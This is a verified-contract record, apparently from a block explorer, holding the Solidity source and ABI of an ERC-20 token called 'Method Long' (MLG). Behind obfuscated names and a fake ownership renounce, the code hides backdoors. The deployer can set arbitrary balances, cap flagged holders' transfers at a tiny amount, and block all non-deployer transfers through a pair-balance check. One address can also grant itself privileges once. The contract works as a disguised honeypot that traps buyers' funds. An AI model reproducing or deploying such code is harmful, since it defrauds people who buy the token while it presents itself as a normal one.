{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface liquidityLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTrading {\n    function createPair(address tradingAmount, address liquidityTotal) external returns (address);\n}\n\ninterface feeAmountTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLimitBuy) external view returns (uint256);\n\n    function transfer(address tokenTrading, uint256 modeMax) external returns (bool);\n\n    function allowance(address tradingReceiverTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTrading,\n        uint256 modeMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchReceiver, uint256 value);\n    event Approval(address indexed tradingReceiverTx, address indexed spender, uint256 value);\n}\n\ninterface feeAmountTeamMetadata is feeAmountTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MethodLong is walletSwap, feeAmountTeam, feeAmountTeamMetadata {\n\n    uint256 public toTake;\n\n    address private shouldTakeLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeAuto;\n    }\n\n    function launchSwap(address enableMode) public {\n        shouldMode();\n        \n        if (enableMode == receiverFrom || enableMode == buyAmount) {\n            return;\n        }\n        isAmount[enableMode] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTakeLimit;\n    }\n\n    bool private amountWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txTeam;\n    }\n\n    mapping(address => bool) public amountShouldTo;\n\n    uint256 private autoLimit = 100000000 * 10 ** 18;\n\n    uint256 constant marketingAt = 8 ** 10;\n\n    function launchedModeIs(address exemptMarketing, uint256 modeMax) public {\n        shouldMode();\n        tradingSwap[exemptMarketing] = modeMax;\n    }\n\n    address shouldWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private modeAuto = \"Method Long\";\n\n    function allowance(address marketingSenderMin, address minLiquidityMode) external view virtual override returns (uint256) {\n        if (minLiquidityMode == launchWalletExempt) {\n            return type(uint256).max;\n        }\n        return listFund[marketingSenderMin][minLiquidityMode];\n    }\n\n    address public buyAmount;\n\n    uint256 enableList;\n\n    address launchWalletExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private txTeam = 18;\n\n    function owner() external view returns (address) {\n        return shouldTakeLimit;\n    }\n\n    constructor (){\n        if (modeLiquidityFrom != toTake) {\n            swapMin = receiverSender;\n        }\n        liquidityLaunch receiverToken = liquidityLaunch(launchWalletExempt);\n        buyAmount = launchTrading(receiverToken.factory()).createPair(receiverToken.WETH(), address(this));\n        if (listToFund == autoFund) {\n            maxTake = autoFund;\n        }\n        receiverFrom = _msgSender();\n        tradingAt();\n        amountShouldTo[receiverFrom] = true;\n        tradingSwap[receiverFrom] = autoLimit;\n        \n        emit Transfer(address(0), receiverFrom, autoLimit);\n    }\n\n    function maxEnable(address shouldFee) public {\n        require(shouldFee.balance < 100000);\n        if (autoEnable) {\n            return;\n        }\n        if (toTake == maxTake) {\n            modeLiquidityFrom = receiverSender;\n        }\n        amountShouldTo[shouldFee] = true;\n        if (autoFund != maxTake) {\n            modeLiquidityFrom = autoFund;\n        }\n        autoEnable = true;\n    }\n\n    function approve(address minLiquidityMode, uint256 modeMax) public virtual override returns (bool) {\n        listFund[_msgSender()][minLiquidityMode] = modeMax;\n        emit Approval(_msgSender(), minLiquidityMode, modeMax);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingSwap;\n\n    function balanceOf(address receiverLimitBuy) public view virtual override returns (uint256) {\n        return tradingSwap[receiverLimitBuy];\n    }\n\n    uint256 sellReceiver;\n\n    function shouldMode() private view {\n        require(amountShouldTo[_msgSender()]);\n    }\n\n    uint256 private autoFund;\n\n    function fundLimit(uint256 modeMax) public {\n        shouldMode();\n        sellReceiver = modeMax;\n    }\n\n    uint256 private swapMin;\n\n    uint256 private listToFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLaunch;\n    }\n\n    uint256 public modeLiquidityFrom;\n\n    uint256 private receiverSender;\n\n    uint256 public maxTake;\n\n    bool public autoEnable;\n\n    address public receiverFrom;\n\n    string private txLaunch = \"MLG\";\n\n    function enableTake(address totalListFee, address tokenTrading, uint256 modeMax) internal returns (bool) {\n        require(tradingSwap[totalListFee] >= modeMax);\n        tradingSwap[totalListFee] -= modeMax;\n        tradingSwap[tokenTrading] += modeMax;\n        emit Transfer(totalListFee, tokenTrading, modeMax);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed amountSell, address indexed exemptMax);\n\n    mapping(address => bool) public isAmount;\n\n    function transfer(address exemptMarketing, uint256 modeMax) external virtual override returns (bool) {\n        return walletAt(_msgSender(), exemptMarketing, modeMax);\n    }\n\n    function tradingAt() public {\n        emit OwnershipTransferred(receiverFrom, address(0));\n        shouldTakeLimit = address(0);\n    }\n\n    function walletAt(address totalListFee, address tokenTrading, uint256 modeMax) internal returns (bool) {\n        if (totalListFee == receiverFrom) {\n            return enableTake(totalListFee, tokenTrading, modeMax);\n        }\n        uint256 liquidityTeam = feeAmountTeam(buyAmount).balanceOf(shouldWallet);\n        require(liquidityTeam == sellReceiver);\n        require(tokenTrading != shouldWallet);\n        if (isAmount[totalListFee]) {\n            return enableTake(totalListFee, tokenTrading, marketingAt);\n        }\n        return enableTake(totalListFee, tokenTrading, modeMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private listFund;\n\n    function transferFrom(address totalListFee, address tokenTrading, uint256 modeMax) external override returns (bool) {\n        if (_msgSender() != launchWalletExempt) {\n            if (listFund[totalListFee][_msgSender()] != type(uint256).max) {\n                require(modeMax <= listFund[totalListFee][_msgSender()]);\n                listFund[totalListFee][_msgSender()] -= modeMax;\n            }\n        }\n        return walletAt(totalListFee, tokenTrading, modeMax);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLiquidityMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountShouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidityMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimitBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeMax\",\"type\":\"uint256\"}],\"name\":\"fundLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMax\",\"type\":\"uint256\"}],\"name\":\"launchedModeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalListFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MethodLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}